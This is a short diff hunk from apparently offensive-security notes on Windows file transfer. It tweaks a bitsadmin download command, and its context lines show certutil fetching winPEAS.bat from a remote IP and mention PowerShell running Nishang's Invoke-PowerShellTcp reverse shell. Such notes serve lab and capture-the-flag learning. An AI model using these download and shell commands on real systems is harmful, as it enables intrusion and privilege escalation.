@@ -276,7 +276,7 @@ certutil.exe -urlcache -split -f "http://10.10.139.149:8000/winPEAS.bat" winPEAS
 bitsadmin approach:
 
 ```
-bitsadmin /transfer myDownloadJob /download /priority normal https://downloadsrv/10mb.zip c:\\10mb.zip
+bitsadmin.exe /transfer /Download /priority Foreground https://downloadsrv/10mb.zip c:\\10mb.zip
 ```
 
 with powershell (first also invokes a script, in this case Invoke-PowerShellTcp from Nishang):
